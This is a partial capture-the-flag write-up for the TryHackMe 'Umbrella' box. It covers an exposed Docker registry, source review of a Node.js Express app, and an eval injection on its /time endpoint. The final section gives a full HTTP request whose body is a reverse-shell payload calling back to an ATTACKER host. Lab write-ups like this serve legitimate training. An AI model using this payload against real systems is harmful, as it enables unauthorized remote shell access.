---
title: "Umbrella"
type: docs
tags:
  - thm
  - linux
  - medium
  - docker-registry
  - nodejs
  - eval-injection
  - sqli
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Medium, **IP:** 10.10.248.230

</div>

<div class="callout callout-warning">

**Partial**

Recorded through source review of the pulled Docker image; exploitation of the `eval` sink / SQLi and root aren't written up.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. **Docker Registry** (v2 API) exposed on **5000** with no auth → `GET /v2/_catalog` → `umbrella/timetracking`. Pull the image and unpack the layers.
2. `usr/src/app/app.js` (the Express "time tracking" app on 8080) has two bugs:
   - **`/time`**, `parseInt(eval(request.body.time))` → **Node `eval` RCE** for an authenticated user.
   - **`/auth`**, parameterised, but `username` is echoed into logs; MySQL creds come from env (`DB_USER`/`DB_PASS`).
3. Register/log in, hit `/time` with `time=` a JS payload spawning a reverse shell → shell in the container/host.
4. Loot MySQL (5.7.40) → user creds → SSH; privesc likely via Docker group / registry creds.

</div>

## Reconnaissance

```console
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
3306/tcp open  mysql   MySQL 5.7.40
5000/tcp open  http    Docker Registry (API: 2.0)
8080/tcp open  http    Node.js (Express) — "Login"
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Docker Registry, pull the app image

```console
$ curl -s http://10.10.248.230:5000/v2/_catalog
{"repositories":["umbrella/timetracking"]}
```

```bash
python docker_image_fetch.py -u http://10.10.248.230:5000/
# -> umbrella/timetracking:latest  -> ./umbrella/  (unpack every blob tarball)
```

## Source review, `usr/src/app/app.js`

```js
// DB creds from env
const connection = mysql.createConnection({
    host: process.env.DB_HOST, user: process.env.DB_USER,
    password: process.env.DB_PASS, database: process.env.DB_DATABASE
});

// /time  -> Node eval() injection  (authenticated)
app.post('/time', function(request, response) {
  if (request.session.loggedin && request.session.username) {
    let timeCalc = parseInt(eval(request.body.time));   // <-- RCE
    ...
  }
});

// /auth  -> parameterised query; MD5(password)
connection.query('SELECT * FROM users WHERE user = ? AND pass = ?', [username, hash], ...);
```

## Foothold, `eval` RCE on `/time`

Log in, then:

```http
POST /time HTTP/1.1
Host: 10.10.248.230:8080
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=<session>

time=global.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/ATTACKER/9001 0>&1"')
```
